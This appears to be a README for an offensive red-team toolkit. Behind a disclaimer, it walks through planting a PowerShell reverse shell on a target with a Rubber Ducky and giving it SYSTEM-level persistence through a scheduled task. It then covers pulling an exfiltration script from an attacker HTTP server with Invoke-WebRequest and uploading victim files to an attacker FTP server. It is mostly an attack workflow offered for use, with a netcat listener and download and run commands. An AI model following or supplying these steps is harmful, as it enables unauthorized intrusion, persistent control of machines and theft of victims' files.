⚠️ Disclaimer
This project is created strictly for educational purposes, penetration testing, and red team research in authorized environments only.

Any use of this code outside of a controlled, lawful environment — such as unauthorized access, system exploitation, or malicious deployment — is strictly prohibited and may be illegal.

The author(s) of this project do not endorse or support any illegal activity and assume no responsibility for misuse or damage caused by the use of this tool.

Always obtain explicit written permission before testing any system or network that you do not own.


---

#  Project Execution Flow

This setup consists of two main modules:

1. **Reverse Shell Module** – for gaining initial access and persistence.
2. **File Transfer Module** – for uploading files from the victim system to your own server via FTP.

---

##  Reverse Shell Module

> This module establishes a reverse shell from the victim machine back to the attacker system and ensures it persists across reboots and unlocks.

###  Prerequisite

* Start a Netcat listener on your attacker machine:

```bash
nc -nvlp 1111
```

This sets up a listener on port `1111` to receive the incoming reverse shell connection.

---

### 🔹 Step-by-Step

#### **1. Deploy `L.ps1` using Rubber Ducky**

* Copy the PowerShell reverse shell script `L.ps1` to the **Rubber Ducky** (CIRCUITPY drive).
* Flash the Rubber Ducky with the provided `payload.dd` Ducky Script.
* Plug the Ducky into the target machine. It will:

  * Copy `L.ps1` to `C:\Windows\System32\`
  * Execute it silently using PowerShell
* This establishes a reverse shell connection to your Netcat listener.

---

#### **2. Establish Persistence (Optional but Recommended)**

* On the victim system (via the reverse shell), run the **single-line persistence command** found in the `persistence.ps1` file.
* This command sets up a **scheduled task** that:

  * Runs `L.ps1` on system startup and unlock.
  * Uses **NT AUTHORITY\SYSTEM** privileges.

Once done, you will have a **persistent reverse shell** as SYSTEM — even after reboots or user unlocks.

---

##  File Transfer Module

> This module allows you to transfer files from the victim system to your attacker-controlled FTP server using PowerShell.

###  Prerequisite

* Start a local HTTP server on the attacker machine in the folder where `Transfer.ps1` is located:

```bash
python3 -m http.server 8000
```

---

### 🔹 Step-by-Step

#### **1. Download `Transfer.ps1` to Victim**

From the victim machine (via reverse shell), download the `Transfer.ps1` script using:

```powershell
Invoke-WebRequest -Uri "http://<attacker-ip>:8000/Transfer.ps1" -OutFile "C:\Windows\System32\Transfer.ps1"
```

Replace `<attacker-ip>` with your actual IP address.

---

#### **2. Configure FTP Server**

* Host an FTP server on your machine using tools like `vsftpd`.
* Ensure:

  * The FTP server is running on the port defined in the script (default: `21`).
  * A directory named `uploads` exists on the FTP server.
  * The credentials used in `Transfer.ps1` (username & password) match your server configuration.

---

#### **3. Set Variables in `Transfer.ps1`**

Before executing the script, set the following variables at the top of `Transfer.ps1`:

```powershell
$ftpserver      = "192.168.1.10"
$ftpport        = 21
$ftpusername    = "ftpuser"
$ftppassword    = "password123"
$localfilepath  = "C:\Path\To\Your\Files\File_name"
$remotefilename = "Output_File_Name_you_want_on_the_server" 
```



---

#### **4. Execute the File Transfer**

Run the transfer script from the victim system:

```powershell
& "C:\Windows\System32\Transfer.ps1"
```

This will upload the specified file(s) to your FTP server’s `/uploads` directory.

---